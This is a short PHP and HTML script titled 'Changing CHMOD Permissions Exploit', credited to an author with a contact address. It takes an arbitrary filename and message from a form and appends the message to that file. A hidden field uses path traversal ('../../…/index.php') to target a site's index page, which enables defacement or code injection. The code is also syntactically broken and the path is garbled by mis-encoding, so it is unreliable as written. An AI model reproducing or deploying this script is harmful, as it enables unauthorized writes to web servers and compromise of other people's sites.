<?php
@$filename = stripslashes($_POST['filename']);
@$mess = stripslashes($_POST['mess']);
$fp = @fopen({$_POST['filename']}, 'a');
@fputs($fp,$mess <hr size=1 color=black>);
@fclose($fp);
?>
<form name=form1 action=exploit.php method=post>
<p align=center><b>
<br>
CODE :<br>
<textarea name=mess rows=3></textarea></font></b></textarea>
</font></b> <p><input type=hidden name=filename value=../../Â·¾¶/index.php></p>
<center>
<input type=reset name=Submit value=Delete>
<input name=go type=submit value=Send onClick=javascript:this.style.visibility ='hidden';>
<center>
</form>
<meta http-equiv=Content-Type content=text/html; charset=iso-8859-1>
<title>Changing CHMOD Permissions Exploit ¨C Contact : the_gl4di4t0r[AT]hotmail[DOT]com</title>
</head>
<body>
</center>
</body>